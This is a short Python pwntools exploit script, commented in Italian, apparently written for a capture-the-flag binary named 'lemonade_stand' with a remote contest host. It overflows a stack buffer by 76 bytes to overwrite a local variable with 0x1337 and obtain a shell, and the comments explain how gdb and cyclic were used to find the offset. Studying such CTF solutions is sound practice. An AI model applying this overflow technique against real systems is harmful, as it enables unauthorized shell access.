#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF("../lemonade_stand", checksec=False)

REMOTE_HOST = "offsec.m0lecon.it"
REMOTE_PORT = 13588

p = process(elf.path)
#p = remote(REMOTE_HOST, REMOTE_PORT)
p.recvuntil(b'price:')          # adegua al prompt reale

OFFSET_BUF_TO_VAR = 76        # misurato con cyclic e gdb, considerando che la variabile target è all'indirizzo rbp-4(capito facendo disass vuln con gdb), cyclic ho trovato l'offest fino e RBP (ce è 80) ed ho sottrato 4 byte

"""
[BUFFER]    <--64
[PADDING]   
[TARGET]    <--4  RBP-4
[RBP]       <--8  OFFSET_TO_RBP 80
[RIP]       

"""

"""
L'idea qui è sovrascrivere la varibile target con il valore "0x1337" in modo che entri nel ramo "giusto" e mi espone una shell
"""



payload = b"A"*OFFSET_BUF_TO_VAR + p64(0x1337)  # little-endian: 37 13 00 00

p.sendline(payload)
p.interactive()
